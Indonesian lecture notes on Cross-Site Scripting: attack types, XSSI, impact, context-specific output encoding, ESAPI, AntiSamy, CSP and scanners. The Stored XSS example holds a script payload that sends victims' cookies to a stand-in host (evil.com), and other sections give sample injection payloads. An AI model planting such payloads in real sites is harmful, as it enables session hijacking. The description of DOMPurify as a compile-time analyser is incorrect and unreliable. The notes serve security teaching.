---
type: Note
cssclasses:
  - cornell-notes
---

_Back to_ [[Keamanan Aplikasi Web]]

> [!cornell] Cross‑Site Scripting (XSS) Attacks and Defenses
>
> > ## Questions/Cues
> >
> > - Mengapa skrip berbahaya dapat dijalankan di browser korban?
> > - Bagaimana perbedaan antara XSS tersimpan dan XSS terrefleksi?
> > - Apa yang dimaksud dengan XSSI (Cross‑Site Script Inclusion)?
> > - Bagaimana cara melakukan *output encoding* yang tepat pada konteks HTML?
> > - Mengapa kebijakan *Same Origin Policy* tidak melindungi dari XSS?
> > - Apa peran OWASP ESAPI dalam mitigasi XSS?
> > - Bagaimana cara menguji kerentanan XSS secara otomatis?
> >
> > ## Reference Points
> >
> > - Lecture_XSS.pptx (Slides 15‑24)
> > - OWASP_XSS_CheatSheet.pdf (Pages 1‑8)
> > - ESAPI_Documentation.pdf (Pages 12‑18)
> > - AntiSamy_UserGuide.pdf (Pages 3‑7)
> > - SecureCoding_Book_Ch12.pdf (Pages 210‑225)
>
> > ### Overview of Cross‑Site Scripting
> >
> > Cross‑Site Scripting (XSS) adalah kerentanan yang memungkinkan penyerang menyuntikkan **skrip berbahaya** (biasanya JavaScript) ke dalam halaman web yang dipercaya oleh pengguna. Ketika korban membuka halaman tersebut, skrip yang disisipkan dijalankan dalam konteks browser korban, sehingga memperoleh akses penuh ke **Document Object Model (DOM)**, cookie, token sesi, dan data sensitif lainnya. Pada dasarnya, XSS memanfaatkan fakta bahwa aplikasi web **menampilkan kembali data yang diberikan pengguna** tanpa melakukan sanitasi atau enkoding yang memadai.
> >
> > Dari perspektif keamanan, XSS dianggap kritis karena tidak memerlukan eksploitasi pada server; semua aksi terjadi di sisi klien. Oleh karena itu, dampaknya dapat meliputi pencurian kredensial, pengalihan ke situs phishing, atau bahkan pemasangan **proxy XSS** yang memungkinkan penyerang mengendalikan seluruh interaksi pengguna dengan aplikasi target.
> >
> > Secara historis, XSS masuk dalam daftar **OWASP Top 10** sejak tahun 2007 dan tetap berada di posisi tinggi pada edisi‑edisi berikutnya, menandakan bahwa banyak aplikasi masih gagal mengimplementasikan mitigasi yang tepat.
> >
> > ### Types of XSS
> >
> > XSS dapat diklasifikasikan menjadi tiga kategori utama, masing‑masing dengan mekanisme penyisipan data yang berbeda:
> >
> > 1. **Stored XSS (Persisten)** – Data berbahaya disimpan secara permanen di server, misalnya dalam basis data, komentar, atau profil pengguna. Ketika halaman yang memuat data tersebut dibuka oleh korban, skrip berbahaya langsung dieksekusi. Contoh klasik: penyerang menulis `<script>document.location='http://evil.com?c='+document.cookie</script>` ke dalam kolom komentar; setiap pengguna yang membaca komentar tersebut akan mengirimkan cookie mereka ke penyerang.
> > 2. **Reflected XSS (Non‑Persisten)** – Skrip berbahaya dikirimkan sebagai bagian dari **parameter URL**, **form field**, atau **header HTTP** dan kemudian “dipantulkan” kembali oleh server dalam respons tanpa sanitasi. Karena tidak disimpan, serangan ini biasanya dipicu melalui tautan phishing atau email yang mengarahkan korban ke URL berbahaya.
> > 3. **DOM‑Based XSS** – Pada tipe ini, manipulasi terjadi sepenuhnya di sisi klien. Skrip berbahaya tidak pernah melewati server; melainkan, JavaScript yang ada pada halaman memproses data yang di‑inject (misalnya `location.hash` atau `document.URL`) dan menuliskannya kembali ke DOM tanpa enkoding. Ini membuat deteksi pada sisi server menjadi sulit.
> >
> > Selain tiga tipe utama, materi sumber juga memperkenalkan **XSSI (Cross‑Site Script Inclusion)**, yaitu teknik di mana penyerang memanfaatkan *script inclusion* lintas‑domain untuk mengeksekusi kode berbahaya dalam konteks situs target. Karena kebijakan **Same Origin Policy (SOP)** memperbolehkan sebuah halaman memuat skrip dari domain lain, penyerang dapat menanamkan `<script src="http://victim.com/json?callback=evil"></script>` sehingga fungsi `evil` dijalankan dengan hak istimewa situs korban.
> >
> > ### Attack Vectors and Impact
> >
> > Pada praktiknya, XSS dapat dimanfaatkan untuk berbagai tujuan berbahaya:
> >
> > - **Pencurian Cookie & Token Sesi** – Dengan mengakses `document.cookie`, penyerang dapat mencuri token otentikasi yang kemudian dipakai untuk *session hijacking*.
> > - **Pengalihan Phishing** – Skrip dapat memodifikasi `window.location` sehingga korban diarahkan ke situs palsu yang tampak sah.
> > - **Manipulasi DOM** – Penyerang dapat mengubah tampilan halaman, menambahkan form palsu, atau menyisipkan *keyloggers* berbasis JavaScript.
> > - **Eksekusi Perintah Lanjutan** – Jika aplikasi mengizinkan *AJAX* ke API internal, skrip XSS dapat memanggil endpoint yang seharusnya hanya dapat diakses oleh pengguna yang sah.
> >
> > Dampak ini bersifat **kritis** karena tidak memerlukan akses ke server, melainkan hanya memanfaatkan kepercayaan yang diberikan browser kepada domain yang sah. Oleh karena itu, mitigasi harus dilakukan **di tingkat aplikasi**, bukan hanya pada infrastruktur jaringan.
> >
> > ### Defensive Strategies – Output Encoding & Input Validation
> >
> > Pendekatan paling fundamental untuk mencegah XSS adalah **output encoding**: setiap data yang berasal dari pengguna harus di‑encode sebelum dimasukkan ke dalam *HTML*, *JavaScript*, *CSS*, atau *URL* pada halaman. OWASP menyediakan **XSS Prevention Cheat Sheet** yang merinci skema enkoding untuk masing‑masing konteks:
> >
> > - **HTML Element Content** – Ganti karakter `&`, `<`, `>`, `"`, `'` dengan entitas HTML (`&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`).
> > - **HTML Attribute Values** – Selain entitas di atas, enkode semua karakter non‑alfanumerik menjadi `&#xHH;`.
> > - **JavaScript Data** – Gunakan fungsi `encodeForJavaScript` (misalnya dari OWASP ESAPI) yang mengubah semua karakter non‑alfanumerik menjadi escape `\xHH`.
> > - **CSS Property Values** – Enkoding dengan `encodeForCSS`, mengubah karakter khusus menjadi `\HH`.
> > - **URL Attribute Values** – Terapkan percent‑encoding (`%HH`).
> >
> > Selain enkoding, **validasi putih (whitelist) input** sangat penting. Alih‑alih memeriksa apa yang *tidak* boleh, tentukan pola yang *boleh* (misalnya hanya huruf, angka, dan tanda hubung untuk nama pengguna). Untuk konten HTML yang kompleks, gunakan **OWASP AntiSamy**, sebuah library yang membersihkan HTML berdasarkan kebijakan yang dapat dikonfigurasi, sehingga hanya elemen dan atribut yang diizinkan yang tetap ada.
> >
> > **Header HTTP** seperti `X‑Content‑Type‑Options: nosniff` dan `Content‑Security‑Policy (CSP)` juga dapat menurunkan risiko dengan membatasi sumber skrip yang dapat dijalankan. Meskipun CSP tidak menggantikan enkoding, ia memberikan lapisan pertahanan tambahan dengan memblokir pemuatan skrip dari domain yang tidak terdaftar.
> >
> > ### Safe Escaping Schemes in Various HTML Execution Contexts
> >
> > Pada slide 24, dijelaskan skema enkoding yang berbeda‑beda tergantung pada konteks eksekusi:
> >
> > 1. **HTML Element Content** – gunakan `encodeForHTML`.
> > 2. **HTML Attribute Values** – gunakan `encodeForHTMLAttribute`.
> > 3. **JavaScript Data** – gunakan `encodeForJavaScript`.
> > 4. **CSS Property Values** – gunakan `encodeForCSS`.
> > 5. **URI Attribute Values** – gunakan `encodeForURL`.
> >
> > Praktik terbaik adalah **membatasi** konteks yang dapat menerima data tidak tepercaya hanya pada skema #1 dan #2; semua konteks lain sebaiknya dihindari atau di‑sanitize secara ketat. Implementasi yang konsisten dapat dicapai dengan memanfaatkan **OWASP ESAPI** yang menyediakan API enkoding untuk semua konteks tersebut.
> >
> > ### Additional Mitigations
> >
> > - **HTTPOnly Cookies** – Menandai cookie sesi dengan flag `HttpOnly` sehingga tidak dapat diakses melalui `document.cookie`.
> > - **Binding Session to IP** – Mengikat sesi ke alamat IP pengguna dapat mengurangi efektivitas pencurian cookie, meskipun tidak menghilangkan semua risiko.
> > - **Content Security Policy (CSP)** – Membatasi sumber skrip, mengaktifkan `script-src 'self'` dan menolak `unsafe-inline`.
> > - **Subresource Integrity (SRI)** – Menambahkan hash pada tag `<script>` eksternal untuk memastikan konten tidak diubah.
> >
> > Semua langkah ini harus dipadukan; tidak ada satu teknik pun yang dapat melindungi sepenuhnya dari semua varian XSS.

> [!cornell] #### Summary
>
> **Cross‑Site Scripting (XSS)** memungkinkan penyerang mengeksekusi skrip berbahaya dalam konteks browser korban dengan memanfaatkan kegagalan aplikasi dalam menyanitasi data pengguna. Terdapat tiga tipe utama—*Stored*, *Reflected*, dan *DOM‑Based*—serta varian *XSSI* yang memanfaatkan inklusi skrip lintas‑domain. Mitigasi yang paling efektif meliputi **output encoding** yang disesuaikan dengan konteks (HTML, atribut, JavaScript, CSS, URL), **validasi putih input**, serta penggunaan **OWASP ESAPI**, **AntiSamy**, dan kebijakan **Content Security Policy**. Pendekatan berlapis, termasuk penggunaan cookie `HttpOnly` dan teknik integritas sumber daya, memberikan pertahanan yang kuat terhadap serangan XSS yang terus berkembang.

> [!ad-libitum]- Additional Information
>
> #### Formal Modeling of XSS Vulnerabilities
>
> Untuk memahami XSS secara teoritis, peneliti sering memodelkan interaksi antara *client*, *server*, dan *attacker* menggunakan **automata finite state** atau **process calculi** (misalnya π‑calculus). Model ini menggambarkan alur data mentah (taint) yang mengalir dari input pengguna ke output HTML. Dengan menandai *taint* pada setiap variabel, analisis statis dapat memverifikasi apakah ada jalur yang memungkinkan data tidak ter‑encode mencapai sink (misalnya `innerHTML`). Pendekatan ini menjadi dasar bagi alat‑alat seperti **DOMPurify** yang melakukan analisis lintas‑domain pada waktu kompilasi.
>
> #### Advanced Content Security Policy (CSP) Configurations
>
> CSP bukan sekadar daftar sumber skrip yang diizinkan; ia menyediakan directive seperti `script-src`, `object-src`, `base-uri`, dan `report-uri`. Konfigurasi yang kuat dapat meliputi:
>
> - `script-src 'self' https://cdn.trusted.com;` – hanya mengizinkan skrip dari domain sendiri dan CDN terpercaya.
> - `object-src 'none';` – menolak semua plugin yang dapat dieksekusi.
> - `upgrade-insecure-requests;` – memaksa semua permintaan HTTP menjadi HTTPS, mengurangi risiko *mixed‑content* yang dapat dimanfaatkan untuk XSS.
> - `report-uri /csp-violation-report;` – mengirimkan laporan JSON ke endpoint khusus ketika kebijakan dilanggar, memungkinkan tim keamanan mendeteksi serangan secara real‑time.
>
> Implementasi CSP harus diuji secara menyeluruh karena kebijakan yang terlalu ketat dapat memecah fungsionalitas aplikasi (misalnya, memblokir inline event handler).
>
> #### Automated XSS Detection Tools
>
> Beberapa alat open‑source dapat memindai aplikasi web untuk kerentanan XSS secara otomatis:
>
> - **OWASP ZAP** – menyediakan *active scanner* yang mengirimkan payload XSS (mis. `"><script>alert(1)</script>`) ke setiap parameter dan memeriksa respons untuk refleksi.
> - **Burp Suite Scanner** – memiliki modul *XSS* yang menguji berbagai konteks (HTML, JavaScript, CSS).
> - **Arachni** – scanner berbasis Ruby yang mendukung *DOM‑based* XSS dengan analisis JavaScript dinamis.
>
> Alat‑alat ini menghasilkan laporan yang mencantumkan *payload* yang berhasil, lokasi parameter, dan rekomendasi perbaikan (biasanya enkoding atau sanitasi). Namun, hasil otomatis harus diverifikasi secara manual karena *false positive* umum terjadi pada aplikasi yang menggunakan teknik rendering khusus.
>
> #### Edge Cases and Nuances
>
> - **Polyglot Payloads** – Skrip yang dirancang untuk bekerja di beberapa konteks sekaligus (HTML, JavaScript, CSS) dengan memanfaatkan karakter escape yang berbeda. Contoh: `"><svg/onload=alert(1)>`.
> - **JSONP Injection** – Pada API yang menggunakan *JSON with Padding*, penyerang dapat menyisipkan fungsi JavaScript berbahaya sebagai callback, mirip dengan XSSI.
> - **Template Injection** – Jika aplikasi menggunakan engine templating (mis. Handlebars, Mustache) tanpa membatasi ekspresi, penyerang dapat mengeksekusi kode template yang menghasilkan XSS.
> - **Browser Quirks** – Beberapa versi lama browser memperlakukan tag `<script>` yang tidak lengkap atau atribut tidak standar secara berbeda, memungkinkan bypass enkoding tradisional.
>
> #### Self‑Exploration Projects
>
> 1. **Implementasi Sanitizer Kustom dengan ESAPI** – Buat modul Java atau Python yang menerima input mentah, menerapkan `encodeForHTML`, `encodeForJavaScript`, dan `encodeForURL` secara dinamis berdasarkan konteks yang terdeteksi, lalu uji dengan serangkaian payload XSS polyglot.
> 2. **CSP Violation Logger** – Kembangkan endpoint server (mis. `/csp-report`) yang menerima laporan CSP dalam format JSON, menyimpan ke basis data, dan menampilkan dashboard statistik serangan XSS yang terdeteksi.
>
> #### Tools and Resources
>
> - **OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet** – https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
> - **OWASP ESAPI (Enterprise Security API)** – https://owasp.org/www-project-enterprise-security-api/
> - **OWASP AntiSamy** – https://owasp.org/www-project-antisamy/
> - **DOMPurify** (JavaScript sanitization library) – https://github.com/cure53/DOMPurify
> - **Content Security Policy (CSP) Level 3 Specification** – https://www.w3.org/TR/CSP3/
>
> #### Further Reading
>
> - *“The Web Application Hacker's Handbook”* – Dafydd Stuttard & Marcus Pinto, Chapter 9 (XSS).
> - *“Secure Coding in Java”* – Robert C. Seacord, bagian tentang *output encoding* dengan ESAPI.
> - *“HTML5 Security Cheat Sheet”* – OWASP, khususnya bagian tentang *DOM‑based XSS*.
> - *“CSP: A Practical Guide”* – Nikita Popov, artikel di *Security